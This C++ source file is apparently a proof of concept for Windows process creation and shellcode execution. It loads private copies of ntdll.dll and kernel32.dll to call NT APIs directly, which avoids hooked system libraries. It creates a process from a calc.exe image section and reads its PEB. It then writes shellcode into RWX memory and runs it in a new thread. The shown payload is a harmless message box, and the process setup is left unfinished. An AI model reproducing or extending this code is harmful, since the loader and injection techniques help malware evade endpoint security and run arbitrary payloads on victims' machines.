#include <stdio.h>
#include <windows.h>

#include "ntdll_detached.h"
#include "kernel32_detached.h"

#include "peconv.h"
#include "shellcodes.h"

HANDLE run_in_new_thread(HANDLE hProcess, LPVOID entry_point)
{
    HANDLE hMyThread = NULL;
    NTSTATUS status = ntdll_NtCreateThreadEx(&hMyThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) entry_point,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "[ERROR] NtCreateThreadEx failed, status : " << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    return hMyThread;
}

HANDLE open_file(wchar_t* dummy_name)
{
    HANDLE hFile = kernel32_CreateFileW(dummy_name,
        GENERIC_READ,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    return hFile;
}

HANDLE create_process(HANDLE hFile)
{
    HANDLE hSection = nullptr;
    NTSTATUS status = ntdll_NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    HANDLE hProcess = nullptr;
    status = ntdll_NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        ntdll_NtCurrentProcess(), //ParentProcess
        PS_INHERIT_HANDLES, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed" << std::endl;
        return INVALID_HANDLE_VALUE;
    }
    return hProcess;
}

bool run_shellcode(HANDLE hProcess)
{
    PVOID base_addr = 0;
    SIZE_T buffer_size = 0x1000;
    NTSTATUS status = ntdll_NtAllocateVirtualMemory(
        hProcess, 
        &base_addr, 0,
        &buffer_size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        std::cout << "Alloc failed!" << std::endl;
        return false;
    }
    std::cout << "Success" << std::endl;
    std::cout << base_addr << std::endl;
    PVOID shellcode_ptr = NULL;
    ULONG shellcode_size = 0;

#ifndef _WIN64
    shellcode_ptr = messageBox32bit_sc;
    shellcode_size = sizeof(messageBox32bit_sc);
#else
    shellcode_ptr = messageBox64bit_sc;
    shellcode_size = sizeof(messageBox64bit_sc);
#endif
    SIZE_T written = 0;
    BOOL is_ok = kernel32_WriteProcessMemory(hProcess, base_addr, shellcode_ptr, shellcode_size, &written);
    if (is_ok == FALSE) {
        std::cout << "Writing failed!" << std::endl;
        return false;
    }
    HANDLE hThread = run_in_new_thread(hProcess, base_addr);
    if (hThread != INVALID_HANDLE_VALUE) {
        std::cout << "Created Thread, id " << std::hex <<  GetThreadId(hThread) << std::endl;
        WaitForSingleObject(hThread, INFINITE);
    }
    return true;
}

bool buffer_remote_peb(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, OUT PEB &peb_copy)
{
    memset(&peb_copy,0,sizeof(PEB));
    PPEB remote_peb_addr = pi.PebBaseAddress;
#ifdef _DEBUG
    std::cout << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
#endif 
    // Write the payload's ImageBase into remote process' PEB:
    NTSTATUS status = ntdll_NtReadVirtualMemory(hProcess, remote_peb_addr, &peb_copy, sizeof(PEB), NULL);
    if (status != STATUS_SUCCESS)
    {
        std::cerr <<"Cannot read remote PEB: "<< GetLastError() << std::endl;
        return false;
    }
    return true;
}

bool run_new_process(wchar_t *path)
{
    HANDLE file = open_file(path);
    if (file == INVALID_HANDLE_VALUE) {
        std::cerr << "Opening file failed!" << std::endl;
        return false;
    }
    HANDLE hProcess = create_process(file);
    if (hProcess == INVALID_HANDLE_VALUE) {
        std::cerr << "Creating process failed!" << std::endl;
        return false;
    }
    PROCESS_BASIC_INFORMATION pbi = { 0 };

    DWORD ReturnLength = 0;
    NTSTATUS status = ntdll_NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed" << std::endl;
        return false;
    }
    std::cout << "PEB:" << pbi.PebBaseAddress << std::endl;
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pbi, peb_copy)) {
        return false;
    }
    std::cout << "ImageBaseAddress: " << peb_copy.ImageBaseAddress << std::endl;
    //TODO: setup process parameters
    //TODO2: run a thread inside the process
    return true;
}

int main(int argc, char *argv[])
{
    size_t ntdll_size = 0;
    HMODULE ntdll_module = load_ntdll(ntdll_size);
    if (!init_ntdll_func(ntdll_module)) {
        std::cerr << "Init Ntdll failed!" << std:: endl;
        system("pause");
        return -1;
    }

    buffered_dlls_resolver my_resolver;
    my_resolver.redirect_module("ntdll.dll", ntdll_module);

    HMODULE kernel32_module = load_kernel32(&my_resolver);
    if (!kernel32_module) {
        std::cerr << "Kernel32 loading failed!" << std:: endl;
        system("pause");
        return -1;
    }
    if (!init_kernel32_func(kernel32_module)) {
        std::cerr << "Init Kernel32 failed!" << std:: endl;
        system("pause");
        return -1;
    }

    wchar_t target[MAX_PATH];
    ExpandEnvironmentStringsW(L"%SystemRoot%\\system32\\calc.exe", target, MAX_PATH);
    if (run_new_process(target)) {
        std::cout <<"[+] Process init ok!" << std::endl;
    }

    if (run_shellcode(ntdll_NtCurrentProcess())) {
        std::cout <<"[+] Success" << std::endl;
    }
    system("pause");
    return 0;
}

